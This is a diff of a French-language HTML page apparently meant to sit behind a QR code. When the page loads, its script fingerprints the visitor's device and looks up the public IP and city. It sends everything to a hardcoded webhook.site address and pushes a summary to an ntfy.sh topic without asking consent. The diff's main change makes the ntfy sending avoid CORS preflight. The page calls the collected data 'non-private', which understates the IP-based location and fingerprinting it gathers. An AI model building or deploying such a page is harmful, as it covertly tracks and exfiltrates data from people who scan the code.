@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <title>Landing — collecte (auto, sans permissions)</title>
+  <title>Landing — collecte auto (ntfy compatible)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px;max-width:920px;margin:auto}
@@ -13,8 +13,8 @@
 </head>
 <body>
   <div class="note">
-    Cette page collecte automatiquement des informations techniques non privées (UA, modèle si exposé, écran, réseau, IP publique, etc.). Elle <b>ne</b> récupère pas la géolocalisation fine ni le nom du téléphone sans permission.  
-    <span class="muted">Si tu veux ajouter la géoloc (popup), ajoute <code>&geo=1</code> à l’URL du QR.</span>
+    Cette page collecte automatiquement des informations techniques non privées (UA, modèle si exposé, écran, réseau, IP publique, etc.).  
+    Elle <b>ne</b> récupère pas la géolocalisation fine ni le nom du téléphone sans permission (ajoute <code>&geo=1</code> si tu veux demander la géoloc).
   </div>
 
   <h1>Scan reçu — collecte automatique</h1>
@@ -22,11 +22,17 @@
   <pre id="dump">préparation…</pre>
 
 <script>
-/* ====================== CONFIG ====================== */
-/* Remplace par ta valeur par défaut si tu veux */
+/* ====================== CONFIG DEFAULTS ======================
+ Replace these defaults if you want built-in values.
+ You can also override via URL params:
+  - wh = webhook URL (ex: https://webhook.site/XXXX)
+  - topic = ntfy topic (ex: qr-scann-test-1)
+  - autosend = 1 or 0
+  - geo = 1 to request geolocation (will show browser popup)
+============================================================= */
 const DEFAULT_WEBHOOK_URL = 'https://webhook.site/3ff17bc2-1614-47e8-a254-77fd25e86dda';
-const DEFAULT_NTFY_TOPIC  = 'qr-scann-test-1';
-/* ==================================================== */
+const DEFAULT_NTFY_TOPIC  = 'maison';
+/* =========================================================== */
 
 const $ = s => document.querySelector(s);
 const setStatus = t => { $('#status').textContent = t; };
@@ -35,10 +41,10 @@ const showDump = o => { $('#dump').textContent = JSON.stringify(o, null, 2); };
 const qs = new URLSearchParams(location.search);
 const WEBHOOK_URL = qs.get('wh') || DEFAULT_WEBHOOK_URL;
 const NTFY_TOPIC  = qs.get('topic') || DEFAULT_NTFY_TOPIC;
-const AUTO_SEND   = (qs.get('autosend') ?? '1') !== '0';
-const WANT_GEO    = (qs.get('geo') ?? '0') === '1'; // si 1 => demandera permission geoloc
+const AUTO_SEND   = (qs.get('autosend') ?? '1') !== '0'; // default on
+const WANT_GEO    = (qs.get('geo') ?? '0') === '1';      // default off
 
-/* ------------------ helpers ------------------ */
+/* ---------------- util ---------------- */
 function randId(len=10){
   const chars='abcdef0123456789';
   let out='';
@@ -46,7 +52,7 @@ function randId(len=10){
   return out;
 }
 
-/* Collecte d'infos natives (sans permissions) */
+/* Collecte non-intrusive d'infos (sans permissions) */
 async function collectClientInfo({allowGeo=false} = {}){
   const info = {};
   info.ts = new Date().toISOString();
@@ -71,14 +77,14 @@ async function collectClientInfo({allowGeo=false} = {}){
   };
   info.viewport = { innerWidth: innerWidth, innerHeight: innerHeight, devicePixelRatio: window.devicePixelRatio };
 
-  // device info heuristiques
+  // device heuristics
   info.device = {
     hardwareConcurrency: navigator.hardwareConcurrency || null,
     deviceMemory: navigator.deviceMemory || null,
     maxTouchPoints: navigator.maxTouchPoints || 0
   };
 
-  // UA Client Hints (if available) - non-intrusive
+  // UA Client Hints (non-intrusive)
   try {
     if (navigator.userAgentData) {
       info.uaData = { mobile: navigator.userAgentData.mobile ?? null, brands: navigator.userAgentData.brands ?? null };
@@ -99,7 +105,7 @@ async function collectClientInfo({allowGeo=false} = {}){
     if (c) info.connection = { effectiveType: c.effectiveType || null, downlink: c.downlink || null, rtt: c.rtt || null, saveData: c.saveData || null };
   } catch(e){}
 
-  // battery (généralement accessible sans popup)
+  // battery
   try {
     if (navigator.getBattery) {
       const bat = await navigator.getBattery();
@@ -115,12 +121,12 @@ async function collectClientInfo({allowGeo=false} = {}){
     }
   } catch(e){}
 
-  // webgl info (GPU vendor/renderer possible)
+  // webgl info
   try {
     const c = document.createElement('canvas');
     const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
     if (gl) {
-      const debug = gl.getExtension && gl.getExtension('WEBGL_debug_renderer_info');
+      const debug = gl.getExtension('WEBGL_debug_renderer_info');
       info.webgl = {
         vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
         renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
@@ -128,10 +134,10 @@ async function collectClientInfo({allowGeo=false} = {}){
     }
   } catch(e){ info.webglError = String(e); }
 
-  // mimeTypes (may be empty on mobiles)
+  // mimeTypes
   try { info.mimeTypes = Array.from(navigator.mimeTypes || []).map(m=>({type:m.type,desc:m.description})); } catch(e){}
 
-  // permissions status (query does not trigger prompt)
+  // permissions status (query does NOT trigger popups)
   try {
     if (navigator.permissions && navigator.permissions.query) {
       const names = ['geolocation','camera','microphone','notifications'];
@@ -147,7 +153,7 @@ async function collectClientInfo({allowGeo=false} = {}){
     }
   } catch(e){ info.permissionsError = String(e); }
 
-  // enumerate media devices -> counts (labels will be empty unless permission granted)
+  // enumerate media devices -> counts (labels empty unless permission)
   try {
     if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
       const list = await navigator.mediaDevices.enumerateDevices();
@@ -158,7 +164,7 @@ async function collectClientInfo({allowGeo=false} = {}){
     }
   } catch(e){ info.mediaDevicesError = String(e); }
 
-  // audio context sample rate (no permission)
+  // audio context sample rate
   try {
     const AC = window.AudioContext || window.webkitAudioContext;
     if (AC) {
@@ -168,14 +174,14 @@ async function collectClientInfo({allowGeo=false} = {}){
     }
   } catch(e){}
 
-  // IP + geo via external service (ipapi / ipwho.is fallback)
+  // IP + basic geo via external services (ipapi.co, fallback ipwho.is)
   try {
     let ipResp = null;
     try {
-      const r = await fetch('https://ipapi.co/json/', {cache:'no-store'}); if (r.ok) ipResp = await r.json();
+      let r = await fetch('https://ipapi.co/json/', {cache:'no-store'}); if (r.ok) ipResp = await r.json();
     } catch(e){}
     if(!ipResp){
-      try { const r2 = await fetch('https://ipwho.is/', {cache:'no-store'}); if (r2.ok) ipResp = await r2.json(); } catch(e){}
+      try { let r2 = await fetch('https://ipwho.is/', {cache:'no-store'}); if (r2.ok) ipResp = await r2.json(); } catch(e){}
     }
     if (ipResp) {
       info.ip = ipResp.ip || ipResp.client_ip || null;
@@ -186,7 +192,7 @@ async function collectClientInfo({allowGeo=false} = {}){
     }
   } catch(e){ info.ipError = String(e); }
 
-  // geolocation (only if explicitly allowed via allowGeo param -> will prompt)
+  // geolocation prompt only if allowed by parameter
   if (allowGeo && navigator.geolocation) {
     info.geolocationPrompted = true;
     try {
@@ -207,7 +213,7 @@ async function collectClientInfo({allowGeo=false} = {}){
   return info;
 }
 
-/* send helpers */
+/* POST JSON helper */
 async function postJSON(url, obj){
   try {
     const res = await fetch(url, {
@@ -215,26 +221,37 @@ async function postJSON(url, obj){
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(obj)
     });
-    return { ok: res.ok, status: res.status, text: await res.text().catch(()=>'') };
-  } catch(e){ return { ok:false, error: String(e) }; }
+    return { ok: res.ok, status: res.status, text: await res.text().catch(()=>'' ) };
+  } catch(e) { return { ok:false, error:String(e) }; }
 }
 
-async function sendNtfy(topic, titleLines, clickUrl=null){
+/* ---------- SIMPLE ntfy sender (no custom headers) ----------
+   Uses a plain text POST to avoid preflight CORS issues.
+   The message will appear on https://ntfy.sh/<topic>
+-------------------------------------------------------------- */
+async function sendNtfySimple(topic, titleLines, clickUrl=null){
   try {
-    const headers = {
-      'Content-Type': 'text/plain; charset=utf-8',
-      'Title': titleLines[0] || 'QR scan',
-      'Tags': 'qr,scan',
-      'Priority': '3'
-    };
-    if (clickUrl) headers['Click'] = clickUrl;
-    await fetch(`https://ntfy.sh/${encodeURIComponent(topic)}`, { method:'POST', headers, body: titleLines.join('\n') });
-    return { ok:true };
-  } catch(e){ return { ok:false, error: String(e) }; }
+    const body = [
+      `[QR] ${titleLines[0] || 'QR scan'}`,
+      ...(clickUrl ? [`(Open log: ${clickUrl})`] : []),
+      '---',
+      ...titleLines.slice(1)
+    ].join('\n');
+
+    const res = await fetch(`https://ntfy.sh/${encodeURIComponent(topic)}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain; charset=utf-8' }, // simple request -> no preflight
+      body
+    });
+    return { ok: res.ok, status: res.status };
+  } catch(e) {
+    console.error('ntfy send error', e);
+    return { ok:false, error:String(e) };
+  }
 }
 
-/* simple summarizer for ntfy */
-function makeSummary(info){
+/* small summary for ntfy */
+function summarizeForNtfy(info){
   const ua = info.userAgent || '';
   const model = info.uaData?.highEntropy?.model || null;
   const platform = info.uaData?.highEntropy?.platform || info.platform || null;
@@ -244,48 +261,46 @@ function makeSummary(info){
     /android/i.test(ua) ? 'Android' :
     /windows/i.test(ua) ? 'Windows' :
     /mac os|macintosh/i.test(ua) ? 'Mac' : 'Device';
+
+  const brands = info.uaData?.brands ? info.uaData.brands.map(b=>b.brand||b.brandName||'').join(', ') : null;
+
   const lines = [
-    `QR scan — ${likely}${model ? ' ('+model+')' : ''}`,
-    `IP: ${info.ip || 'n/d'} • ${info.ip_geo?.country || info.ip_geo?.country_name || ''}`,
-    `OS: ${platform || 'n/d'} • Browser: ${info.uaData?.brands ? info.uaData.brands.map(b=>b.brand).join(', ') : 'n/d'}`,
-    `Screen: ${info.screen?.width}x${info.screen?.height} DPR ${info.viewport?.devicePixelRatio || '?'}`,
-    info.connection ? `Network: ${info.connection.effectiveType || '?'} ~${info.connection.downlink || '?'} Mbps` : '',
-    info.battery ? `Battery: ${Math.round((info.battery.level||0)*100)}% ${info.battery.charging? '(charging)':''}` : ''
+    `Scan — ${likely}${model ? ' ('+model+')' : ''}`,
+    `IP: ${info.ip || 'n/d'} • ${info.ip_geo?.country || ''} ${info.ip_geo?.city ? '- '+info.ip_geo.city : ''}`,
+    `OS: ${platform || 'n/d'} • Browser: ${brands || 'n/d'}`,
+    `Screen: ${info.screen?.width || '?'}x${info.screen?.height || '?'} DPR ${info.viewport?.devicePixelRatio || '?'}`,
+    info.connection ? `Net: ${info.connection.effectiveType || '?'} ~${info.connection.downlink || '?'}Mbps` : '',
+    info.battery ? `Battery: ${Math.round((info.battery.level||0)*100)}% ${info.battery.charging? '(charging)':''}` : '',
+    `UA: ${info.userAgent || 'n/d'}`
   ].filter(Boolean);
   return lines;
 }
 
-/* ============ main ============ */
+/* ========== main ========== */
 let lastPayload = null;
 
 async function runMain(){
   try {
     setStatus('Collecte des données (sans permissions)…');
-    const info = await collectClientInfo({ allowGeo: WANT_GEO }); // WANT_GEO true triggers popup
-    lastPayload = {
-      event: 'qr_scan',
-      timestamp: new Date().toISOString(),
-      scan_url: location.href,
-      client: info
-    };
+    const info = await collectClientInfo({ allowGeo: WANT_GEO });
+    lastPayload = { event:'qr_scan', timestamp: new Date().toISOString(), scan_url: location.href, client: info };
     showDump(lastPayload);
 
-    // auto send if demandé
     if (AUTO_SEND) {
       setStatus('Envoi JSON vers webhook…');
       const r = await postJSON(WEBHOOK_URL, lastPayload);
       if (r.ok) setStatus('Envoyé vers webhook ✅ ('+r.status+')');
       else setStatus('Échec envoi webhook — voir console');
 
-      // envoi résumé vers ntfy
-      setStatus('Envoi résumé vers ntfy…');
-      const summary = makeSummary(info);
-      await sendNtfy(NTFY_TOPIC, summary, WEBHOOK_URL);
-      setStatus('Notif ntfy envoyée ✅');
+      // send simple, no-preflight ntfy message
+      setStatus('Envoi résumé vers ntfy (simple)…');
+      const lines = summarizeForNtfy(info);
+      await sendNtfySimple(NTFY_TOPIC, lines, WEBHOOK_URL);
+      setStatus('Notif ntfy envoyée (si réseau le permet) ✅');
     } else {
       setStatus('Collecte terminée — autosend désactivé.');
     }
-  } catch(e){
+  } catch(e) {
     console.error(e);
     setStatus('Erreur — voir console.');
   }
@@ -294,7 +309,7 @@ async function runMain(){
 // start automatically
 runMain();
 
-// Expose for debugging in console
+// debugging helper (console)
 window._qr_lastPayload = () => lastPayload;
 </script>
 </body>
